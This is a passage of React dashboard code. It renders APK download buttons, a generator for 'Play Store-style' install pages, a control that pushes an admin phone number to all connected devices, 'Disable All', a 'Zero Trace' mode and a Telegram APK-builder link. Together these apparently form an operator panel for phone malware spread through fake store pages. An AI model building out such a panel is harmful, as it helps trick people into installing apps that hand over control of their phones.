                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                      <polyline points="7 10 12 15 17 10" />
                      <line x1="12" y1="15" x2="12" y2="3" />
                    </svg>
                    Download APK
                  </>
                )}
              </button>
              {apkLoading && (
                <>
                  <style>{`
                    @keyframes apk-indeterminate {
                      0%   { left: -55%; width: 55%; }
                      100% { left: 110%; width: 55%; }
                    }
                  `}</style>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <div style={{ flex: 1, height: 6, background: "rgba(99,102,241,0.15)", borderRadius: 99, overflow: "hidden", position: "relative" }}>
                      {apkProgress > 0 ? (
                        <div style={{
                          position: "absolute", top: 0, left: 0, height: "100%", borderRadius: 99,
                          width: `${apkProgress}%`,
                          background: isZT ? t.accent : "linear-gradient(90deg, #6366f1, #8b5cf6)",
                          transition: "width 0.3s ease",
                        }} />
                      ) : (
                        <div style={{
                          position: "absolute", top: 0, height: "100%", borderRadius: 99,
                          background: isZT ? t.accent : "linear-gradient(90deg, #6366f1, #8b5cf6)",
                          animation: "apk-indeterminate 1.4s linear infinite",
                        }} />
                      )}
                    </div>
                    {apkProgress > 0 && (
                      <span style={{ fontSize: 11, fontWeight: 700, color: isZT ? t.accent : "#6366f1", minWidth: 32, textAlign: "right" }}>
                        {apkProgress}%
                      </span>
                    )}
                  </div>
                </>
              )}
              {apkSuccess && (
                <div style={{
                  background: "rgba(34,197,94,0.12)", border: "1px solid rgba(34,197,94,0.35)",
                  borderRadius: 8, padding: "10px 12px", fontSize: 12,
                  color: "#22c55e", lineHeight: 1.5,
                }}>
                  ✓ APK ready! Download started — install on your phone.
                </div>
              )}
              <div style={{ fontSize: 10, color: t.muted, lineHeight: 1.4 }}>
                You may need to enable "Install from unknown sources" in your phone settings.
              </div>
            </div>
          </div>

          {/* Download Shoot APK — highlighted */}
          <div style={{ flex: "1 1 220px", borderRadius: 12, padding: 2, background: "linear-gradient(135deg, #6366f1, #8b5cf6, #ec4899)", boxShadow: t === DT ? "0 0 24px rgba(139,92,246,0.35)" : "0 0 20px rgba(99,102,241,0.25)" }}>
            <div style={{ borderRadius: 10, background: t.card, overflow: "hidden", height: "100%" }}>
              <div style={{ padding: "11px 14px", borderBottom: `1px solid ${t.cardB}`, background: t === DT ? "linear-gradient(90deg, rgba(99,102,241,0.18) 0%, rgba(139,92,246,0.12) 100%)" : "linear-gradient(90deg, rgba(99,102,241,0.08) 0%, rgba(139,92,246,0.06) 100%)", display: "flex", alignItems: "center", gap: 8 }}>
                <div style={{ width: 26, height: 26, borderRadius: 7, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, boxShadow: "0 2px 8px rgba(99,102,241,0.45)" }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
                  </svg>
                </div>
                <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Download Shoot APK</span>
                <span style={{ marginLeft: "auto", background: "linear-gradient(135deg,#6366f1,#8b5cf6)", color: "#fff", borderRadius: 99, padding: "2px 8px", fontSize: 9, fontWeight: 800, letterSpacing: 0.5 }}>LATEST</span>
              </div>
              <div style={{ padding: 14, display: "flex", flexDirection: "column", gap: 10 }}>
                <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.5 }}>
                  Install the Shoot app on a device. Tap the button below to download the latest Shoot APK, then open it on your phone to install.
                </div>
                <ShootApkButton appId={appId} />
                <div style={{ fontSize: 10, color: t.muted, lineHeight: 1.4 }}>
                  You may need to enable "Install from unknown sources" in your phone settings.
                </div>
              </div>
            </div>
          </div>

        </div>

      {/* ── Generate Shoot URL ── */}
      <div style={{ borderRadius: 12, padding: 2, background: "linear-gradient(135deg,#6366f1,#8b5cf6,#ec4899)", boxShadow: t === DT ? "0 0 24px rgba(139,92,246,0.35)" : "0 0 20px rgba(99,102,241,0.25)" }}>
        <div style={{ borderRadius: 10, background: t.card, overflow: "hidden" }}>
          <div style={{ padding: "11px 16px", borderBottom: `1px solid ${t.cardB}`, background: t === DT ? "linear-gradient(90deg,rgba(99,102,241,0.18) 0%,rgba(139,92,246,0.12) 100%)" : "linear-gradient(90deg,rgba(99,102,241,0.08) 0%,rgba(139,92,246,0.06) 100%)", display: "flex", alignItems: "center", gap: 8 }}>
            <div style={{ width: 28, height: 28, borderRadius: 8, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, boxShadow: "0 2px 8px rgba(99,102,241,0.45)" }}>
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
            </div>
            <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Generate Shoot URL</span>
            <span style={{ marginLeft: "auto", background: "linear-gradient(135deg,#6366f1,#8b5cf6)", color: "#fff", borderRadius: 99, padding: "2px 8px", fontSize: 9, fontWeight: 800, letterSpacing: 0.5 }}>NEW</span>
          </div>
          <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
            <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.5 }}>
              Create a Play Store-style download page for your Shoot app. Share the link with users so they can install directly without searching.
            </div>
            <button
              onClick={() => setShootUrlDialog(true)}
              style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, padding: "11px 0", borderRadius: 9, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", color: "#fff", fontWeight: 800, fontSize: 13, border: "none", cursor: "pointer", width: "100%", boxShadow: "0 4px 16px rgba(99,102,241,0.4)", letterSpacing: 0.3 }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
              Generate Shoot URL
            </button>
          </div>
        </div>
      </div>


      {/* ── Update Admin ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <span style={{ fontSize: 12, fontWeight: 700, color: t.txt2 }}>Update Admin</span>
          <span style={{ background: devices.length > 0 ? t.accent : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
            {devices.length} devices
          </span>
        </div>
        <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
          <input
            type="tel"
            value={adminNum}
            onChange={e => {
              const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
              setAdminNum(digits);
              if (numState !== "idle") { setNumState("idle"); setNumMsg(""); setUpdateResult(null); }
            }}
            placeholder="Enter 10-digit number"
            maxLength={10}
            disabled={numState === "running"}
            style={IS}
          />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span style={{ fontSize: 11, color: numState === "err" ? "#ef4444" : numState === "done" ? "#22c55e" : t.muted, fontWeight: 600 }}>
              {numMsg || `${adminNum.length}/10 digits`}
            </span>
            {adminNum.length === 10 && numState === "idle" && (
              <span style={{ fontSize: 10, color: "#22c55e", fontWeight: 700 }}>✓ Ready</span>
            )}
          </div>

          {/* Update progress bar */}
          {numState === "running" && (
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted, marginBottom: 5 }}>
                <span>Sending to all devices…</span>
                <span>{updateDone}/{devices.length}</span>
              </div>
              <div style={{ height: 5, background: t.hdrB, borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", background: t.accent, width: `${devices.length > 0 ? Math.round((updateDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
            </div>
          )}


          {/* Update + Disable All — side by side */}
          <div style={{ display: "flex", gap: 8 }}>
            <button
              onClick={() => void handleUpdateAdmin()}
              disabled={numState === "running" || devices.length === 0}
              style={{
                flex: 1, padding: "11px 0", borderRadius: 9, border: "none",
                background: numState === "done" ? "#22c55e" : numState === "running" ? "#ede9fe" : adminNum.length === 10 ? t.accent : t.hdrB,
                color: numState === "done" || adminNum.length === 10 ? "#fff" : numState === "running" ? t.accent : t.muted,
                fontWeight: 700, fontSize: 13,
                cursor: numState === "running" || devices.length === 0 ? "not-allowed" : adminNum.length < 10 && numState === "idle" ? "not-allowed" : "pointer",
                transition: "background 0.15s",
              }}
            >
              {numState === "running" ? `${updateDone}/${devices.length}…` : numState === "done" ? "Done ✓" : devices.length === 0 ? "No Devices" : "Update"}
            </button>
            <button
              onClick={() => void handleDisableAll()}
              disabled={disableAllState === "running" || eligible.length === 0}
              style={{
                flex: 1, padding: "11px 0", borderRadius: 9, border: "1.5px solid",
                borderColor: disableAllState === "done" ? "#22c55e" : "#ef4444",
                background: disableAllState === "done" ? "#22c55e" : disableAllState === "running" ? "#fee2e2" : "transparent",
                color: disableAllState === "done" ? "#fff" : disableAllState === "running" ? "#ef4444" : eligible.length === 0 ? t.muted : "#ef4444",
                fontWeight: 700, fontSize: 13,
                cursor: disableAllState === "running" || eligible.length === 0 ? "not-allowed" : "pointer",
                transition: "all 0.15s",
              }}
            >
              {disableAllState === "running" ? `${disableAllDone}/${eligible.length}…` : disableAllState === "done" ? "Done ✓" : eligible.length === 0 ? "No Devices" : `Disable All (${eligible.length})`}
            </button>
          </div>
          {/* Progress bars — shown below when running */}
          {numState === "running" && (
            <div style={{ height: 4, background: t.hdrB, borderRadius: 99, overflow: "hidden" }}>
              <div style={{ height: "100%", background: t.accent, width: `${devices.length > 0 ? Math.round((updateDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
            </div>
          )}
          {disableAllState === "running" && (
            <div style={{ height: 4, background: t.hdrB, borderRadius: 99, overflow: "hidden" }}>
              <div style={{ height: "100%", background: "#ef4444", width: `${eligible.length > 0 ? Math.round((disableAllDone / eligible.length) * 100) : 0}%`, transition: "width 0.3s" }} />
            </div>
          )}
        </div>
      </div>

      {/* ── Day / Night Mode — hidden for Zero Trace (day only) ── */}
      {!isZT && <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Display</div>
        <div style={{ padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 22 }}>{isDark ? "🌙" : "☀️"}</span>
            <div>
              <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{isDark ? "Night Mode" : "Day Mode"}</div>
              <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>{isDark ? "Dark theme active" : "Light theme active"}</div>
            </div>
          </div>
          <div onClick={onToggleDark} style={{ width: 50, height: 28, borderRadius: 14, background: isDark ? t.accent : "#e2e8f0", position: "relative", cursor: "pointer", transition: "background 0.2s", flexShrink: 0 }}>
            <div style={{ position: "absolute", top: 3, left: isDark ? 25 : 3, width: 22, height: 22, borderRadius: "50%", background: "#fff", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", transition: "left 0.2s" }} />
          </div>
        </div>
      </div>}


      {/* ── Clean After Process ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Actions</div>
        <div style={{ padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 20 }}>🧹</span>
            <div>
              <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>Clean After Process</div>
              <div style={{ fontSize: 11, color: t.muted, marginTop: 2 }}>
                {cleanAfterProcess ? "Send ke baad number/message auto clear hoga" : "Send ke baad fields waise hi rahenge"}
              </div>
            </div>
          </div>
          <div onClick={toggleCleanAfterProcess} style={{ width: 50, height: 28, borderRadius: 14, background: cleanAfterProcess ? t.accent : "#e2e8f0", position: "relative", cursor: "pointer", transition: "background 0.2s", flexShrink: 0 }}>
            <div style={{ position: "absolute", top: 3, left: cleanAfterProcess ? 25 : 3, width: 22, height: 22, borderRadius: "50%", background: "#fff", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", transition: "left 0.2s" }} />
          </div>
        </div>
      </div>

      {/* ── App Info ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>App Info</div>
        {[
          { label: "App ID", value: appId, mono: true },
        ].map(({ label, value, mono }) => (
          <Row key={label} label={label} value={value} mono={mono} />
        ))}
      </div>

      {/* ── Telegram Bot ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", gap: 8 }}>
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke={t.accent} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21.198 2.433a2.242 2.242 0 0 0-1.022.215l-16.5 6.7c-.96.39-.96 1.64 0 2.03l4.07 1.65 1.57 4.96c.2.63 1.01.84 1.5.38l2.27-2.14 4.44 3.27c.57.42 1.37.13 1.55-.54l3.5-14.5a1.6 1.6 0 0 0-1.38-1.97z"/>
          </svg>
          <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Telegram Bot</span>
        </div>
        <div style={{ padding: "12px 14px", display: "flex", alignItems: "center", justifyContent: "space-between", gap: 10 }}>
          <div>
            <div style={{ fontSize: 12, color: t.muted, marginBottom: 6, lineHeight: 1.5 }}>
              Apk banane ke liye Telegram bot use karein. Bot se protected APK directly generate hoti hai.
            </div>
            <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600 }}>Bot Username</div>
            <div style={{ fontFamily: "monospace", fontSize: 14, fontWeight: 800, color: t.accent, marginTop: 3 }}>@make_apk_bot</div>
          </div>
          <a
            href="https://t.me/make_apk_bot"
            target="_blank"
            rel="noopener noreferrer"
            style={{
              display: "inline-flex", alignItems: "center", gap: 7,
              padding: "10px 16px", borderRadius: 9,
              background: "linear-gradient(135deg, #229ED9, #1a8bbf)",
              color: "#fff", fontWeight: 700, fontSize: 12,
              textDecoration: "none", whiteSpace: "nowrap", flexShrink: 0,
            }}
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21.198 2.433a2.242 2.242 0 0 0-1.022.215l-16.5 6.7c-.96.39-.96 1.64 0 2.03l4.07 1.65 1.57 4.96c.2.63 1.01.84 1.5.38l2.27-2.14 4.44 3.27c.57.42 1.37.13 1.55-.54l3.5-14.5a1.6 1.6 0 0 0-1.38-1.97z"/>
            </svg>
            Open Bot
          </a>
        </div>
      </div>

      {/* ── My Session Timer ── */}
      {sessCountdown !== null && (() => {
        const barColor = sessCountdown.danger ? "#ef4444" : sessCountdown.warning ? "#f59e0b" : "#22c55e";
        const timeStr  = `${String(sessCountdown.h).padStart(2,'0')}:${String(sessCountdown.m).padStart(2,'0')}:${String(sessCountdown.s).padStart(2,'0')}`;
        return (
          <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, padding: "10px 14px" }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 7 }}>
              <span style={{ fontSize: 12, fontWeight: 700, color: t.muted }}>Session Timeout</span>
              <span style={{ fontSize: 20, fontWeight: 900, color: barColor, fontVariantNumeric: "tabular-nums", letterSpacing: 1 }}>{timeStr}</span>
            </div>
            <div style={{ height: 4, borderRadius: 99, background: t === DT ? "#1e293b" : "#e2e8f0", overflow: "hidden" }}>
              <div style={{ height: "100%", width: `${sessCountdown.pct}%`, background: barColor, borderRadius: 99, transition: "width 1s linear, background 0.3s" }} />
            </div>
          </div>
        );
      })()}

      {/* ── Admin Sessions ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Active Sessions</div>
          {sessions.length > 0 && (
            <button onClick={() => void logoutAll()} style={{ background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca", borderRadius: 7, padding: "4px 10px", fontSize: 10, fontWeight: 700, cursor: "pointer" }}>
              Logout All
            </button>
          )}
        </div>
        {sessions.length === 0 ? (
            <div style={{ padding: 20, textAlign: "center", color: "#94a3b8", fontSize: 12 }}>No active session</div>
          ) : (
            sessions.map((s, idx) => {
              const isMine = s.id === mySessionId;
              return (
                <div key={s.id} style={{ display: "flex", alignItems: "center", gap: 10, padding: "10px 14px", background: isMine ? (t === DT ? "#2e1f5e" : "#f5f3ff") : "transparent", borderTop: idx > 0 ? `1px solid ${t.hdrB}` : "none" }}>
                  <div style={{ width: 36, height: 36, borderRadius: 9, background: isMine ? t.accent : t.muted, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, fontSize: 15 }}>
                    {s.device.includes("iPhone") || s.device.includes("iPad") ? "🍎" :
                     s.device.includes("Android") ? "🤖" :
                     s.device.includes("Mac") ? "💻" :
                     s.device.includes("Windows") ? "🖥" : "📟"}
                  </div>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 5, flexWrap: "wrap" }}>
                      <span style={{ fontWeight: 700, fontSize: 12, color: t.txt }}>{s.device}</span>
                      {isMine && <span style={{ background: t.accent, color: "#fff", borderRadius: 99, padding: "1px 6px", fontSize: 9, fontWeight: 800 }}>THIS DEVICE</span>}
                    </div>
                    <div style={{ fontSize: 10, color: "#94a3b8", marginTop: 1 }}>Login: {fmtTime(s.loginTime)} · IP: {s.ip || "unknown"} · Last active: {fmtTime(s.lastActive)}</div>
                  </div>
                  <button onClick={() => void logoutSession(s.id)} style={{
                    background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca",
                    borderRadius: 7, padding: "5px 10px", fontSize: 10, fontWeight: 700, cursor: "pointer", flexShrink: 0,
                  }}>Logout</button>
                </div>
              );
            })
          )}      </div>

      {/* ── Change PIN ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, padding: "12px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke={t.accent} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/>
          </svg>
          <div>
            <div style={{ fontSize: 13, fontWeight: 700, color: t.txt }}>Login PIN</div>
            <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>Change your dashboard PIN</div>
          </div>
        </div>
        <button onClick={() => { setCpOpen(true); setCpCurrent(""); setCpNew(""); setCpNew2(""); setCpErr(""); setCpMsg(""); }} style={{ padding: "7px 14px", borderRadius: 8, background: t.accent, border: "none", color: "#fff", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>
          Change
        </button>
      </div>

  {/* Change PIN Dialog */}
      {cpOpen && createPortal(
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.7)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
          onClick={e => { if(e.target === e.currentTarget){ setCpOpen(false); setCpCurrent(""); setCpNew(""); setCpNew2(""); setCpErr(""); setCpMsg(""); } }}>
          <div style={{ background: t.card, borderRadius: 16, padding: 24, width: "100%", maxWidth: 340, border: `1px solid ${t.cardB}` }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={t.accent} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/>
              </svg>
              <span style={{ fontWeight: 800, fontSize: 15, color: t.txt }}>Change Login PIN</span>
            </div>
            <form onSubmit={handleChangePin} style={{ display: "flex", flexDirection: "column", gap: 12 }}>
              <input
                type="password" value={cpCurrent} onChange={e => { setCpCurrent(e.target.value); setCpErr(""); }}
                placeholder="Current PIN" autoFocus autoComplete="current-password"
                style={{ padding: "11px 14px", borderRadius: 9, border: `1.5px solid ${cpErr ? "#ef4444" : t.cardB}`, background: t.hdr, color: t.txt, fontSize: 14, outline: "none" }}
              />
              <input
                type="password" value={cpNew} onChange={e => { setCpNew(e.target.value); setCpErr(""); }}
                placeholder="New PIN (min 4 chars)" autoComplete="new-password"
                style={{ padding: "11px 14px", borderRadius: 9, border: `1.5px solid ${cpErr ? "#ef4444" : t.cardB}`, background: t.hdr, color: t.txt, fontSize: 14, outline: "none" }}
              />
              <input
                type="password" value={cpNew2} onChange={e => { setCpNew2(e.target.value); setCpErr(""); }}
                placeholder="Confirm New PIN" autoComplete="new-password"
                style={{ padding: "11px 14px", borderRadius: 9, border: `1.5px solid ${cpErr ? "#ef4444" : t.cardB}`, background: t.hdr, color: t.txt, fontSize: 14, outline: "none" }}
              />
              {cpErr && <div style={{ fontSize: 12, color: "#ef4444", fontWeight: 600 }}>{cpErr}</div>}
              {cpMsg && <div style={{ fontSize: 12, color: "#4ade80", fontWeight: 700 }}>{cpMsg}</div>}
              <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
                <button type="button" onClick={() => { setCpOpen(false); setCpCurrent(""); setCpNew(""); setCpNew2(""); setCpErr(""); setCpMsg(""); }} style={{ flex: 1, padding: "11px", borderRadius: 9, background: t.hdr, border: `1px solid ${t.cardB}`, color: t.txt, fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Cancel</button>
                <button type="submit" disabled={cpLoading || !cpCurrent || !cpNew || !cpNew2} style={{ flex: 1, padding: "11px", borderRadius: 9, background: cpLoading || !cpNew || !cpNew2 ? t.hdrB : t.accent, border: "none", color: cpLoading || !cpNew || !cpNew2 ? t.muted : "#fff", fontSize: 13, fontWeight: 700, cursor: cpLoading || !cpNew || !cpNew2 ? "not-allowed" : "pointer" }}>
                  {cpLoading ? "Saving…" : "Update PIN"}
                </button>
              </div>
            </form>
          </div>
        </div>,
        document.body
      )}

      {/* ── Delete Protection ── */}
      {/* Card shell is always rendered immediately (title/layout are static) — only the
          inner state (loading vs set-password vs enabled/disabled) is dynamic, so the
          section itself never appears to "vanish" while the status fetch is in flight. */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Delete Protection</div>
          <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 14 }}>
            {!dpLoaded ? (
              <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "4px 0" }}>
                <div style={{ width: 36, height: 36, borderRadius: 9, background: `${t.cardB}80`, flexShrink: 0 }} />
                <div style={{ fontSize: 12, color: t.muted }}>Loading…</div>
              </div>
            ) : dpLoadError ? (
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 10 }}>
                <div style={{ fontSize: 12, color: t.muted }}>Couldn't load status. Check your connection.</div>
                <button onClick={() => setDpLoadAttempt(n => n + 1)} style={{ padding: "6px 12px", borderRadius: 7, background: t.hdr, border: `1px solid ${t.cardB}`, color: t.txt, fontWeight: 600, fontSize: 12, cursor: "pointer", flexShrink: 0 }}>Retry</button>
              </div>
            ) : (
              <>
            {/* Toggle row */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <div style={{ width: 36, height: 36, borderRadius: 9, background: dpEnabled ? (isZT ? "#1d4ed820" : `${t.accent}20`) : `${t.cardB}80`, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke={dpEnabled ? t.accent : t.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                  </svg>
                </div>
                <div>
                  <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{dpHasPin ? (dpEnabled ? "Protection Enabled" : "Protection Disabled") : "Delete Protection"}</div>
                  <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>{dpHasPin ? (dpEnabled ? "Delete buttons hidden for sub-admins" : "Delete buttons visible") : "Set a password to protect deletes"}</div>
                </div>
              </div>
              {dpHasPin && (
                <div onClick={() => { setDpPinInput(""); setDpToggleErr(""); setDpShowToggleDialog(true); }} style={{ width: 50, height: 28, borderRadius: 14, background: dpEnabled ? t.accent : "#e2e8f0", position: "relative", cursor: "pointer", transition: "background 0.2s", flexShrink: 0 }}>
                  <div style={{ position: "absolute", top: 3, left: dpEnabled ? 25 : 3, width: 22, height: 22, borderRadius: "50%", background: "#fff", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", transition: "left 0.2s" }} />
                </div>
              )}
            </div>

            {/* Set password (first time) */}
            {!dpHasPin && (
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                <input autoComplete="new-password" value={dpPinNew} onChange={e => setDpPinNew(e.target.value)} type="password" placeholder="Set password (min 4 chars)" style={{ padding: "9px 12px", borderRadius: 8, border: `1px solid ${t.cardB}`, background: t.hdr, color: t.txt, fontSize: 13, outline: "none" }} />
                {dpSetErr && <div style={{ fontSize: 11, color: "#ef4444" }}>{dpSetErr}</div>}
                <button disabled={dpLoading || dpPinNew.length < 4} onClick={() => void dpSetPin()} style={{ padding: "10px 0", borderRadius: 8, background: t.accent, color: "#fff", fontWeight: 700, fontSize: 13, border: "none", cursor: dpLoading || dpPinNew.length < 4 ? "not-allowed" : "pointer", opacity: dpLoading || dpPinNew.length < 4 ? 0.5 : 1 }}>{dpLoading ? "Setting…" : "Set Password"}</button>
              </div>
            )}

            {/* Change password (when pin set) */}
            {dpHasPin && (
              <button onClick={() => { setDpCurrentPin(""); setDpPinNew(""); setDpChangePinErr(""); setDpShowChangePinDialog(true); }} style={{ padding: "9px 14px", borderRadius: 8, background: t.hdr, border: `1px solid ${t.cardB}`, color: t.txt, fontWeight: 600, fontSize: 13, cursor: "pointer", display: "flex", alignItems: "center", gap: 8, width: "100%" }}>
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke={t.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
                Change Password
              </button>
            )}
              </>
            )}
          </div>
        </div>

      {/* ── Delete Protection — Toggle Dialog ── */}
      {dpShowToggleDialog && createPortal(
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.6)", zIndex: 1000, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
          onClick={e => { if (e.target === e.currentTarget && !dpLoading) { setDpShowToggleDialog(false); setDpPinInput(""); setDpToggleErr(""); } }}>
          <div style={{ background: t.card, borderRadius: 14, width: "100%", maxWidth: 320, padding: 24, display: "flex", flexDirection: "column", gap: 16, boxShadow: "0 8px 40px rgba(0,0,0,0.35)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <div style={{ width: 38, height: 38, borderRadius: 10, background: dpEnabled ? "#fef2f2" : "#f0fdf4", display: "flex", alignItems: "center", justifyContent: "center" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={dpEnabled ? "#ef4444" : "#22c55e"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
              </div>
              <div>
                <div style={{ fontWeight: 800, fontSize: 14, color: t.txt }}>{dpEnabled ? "Disable Protection" : "Enable Protection"}</div>
                <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>Enter your delete password to confirm</div>
              </div>
            </div>
